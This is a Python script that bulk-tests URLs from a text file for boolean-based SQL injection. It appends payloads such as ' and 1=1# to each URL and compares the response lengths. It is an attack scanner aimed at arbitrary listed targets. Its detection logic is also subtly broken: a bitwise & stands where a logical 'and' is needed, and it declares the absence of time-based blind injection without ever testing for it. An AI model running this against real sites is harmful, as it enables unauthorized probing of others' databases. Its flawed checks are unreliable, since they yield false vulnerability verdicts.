#-*- conding:utf-8 -*-
import argparse, sys, requests, time, os, re, json
from multiprocessing.dummy import  Pool
requests.packages.urllib3.disable_warnings()


def poc(url):
    # if result_rep = requests.get(url):
    result_rep = requests.get(url)
    return len(result_rep.text)


def run(url):
    result_lens = []
    rep = requests.get(url, headers=header)
    normal_len = len(rep.text)
    payloads = ["'%20and%201=1%23", "'%20and%201=2%23"]

    for payload in payloads:
        result_len = poc(url + payload)
        result_lens.append(result_len)

    if result_lens[0] == normal_len & normal_len != result_lens[1]:
        print("\n存在sql注入\n")
    elif result_lens[0] == normal_len & normal_len == result_lens[1]:
        try:
            result_rep = requests.get(url, timeout=3)
            print("不存在时间盲注")
        except Exception as e:
            return "timeout"
        print(url + "不存在漏洞")
    else:

        try:
            result_rep = requests.get(url, timeout=3)
            print("no sql injection")
        except Exception as e:
            return "timeout"


if __name__ == "__main__":
    header = {
        "User_Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"}
    urls = open("Time_OUT.txt", 'r').readlines()
    for url in urls:
        run(url)
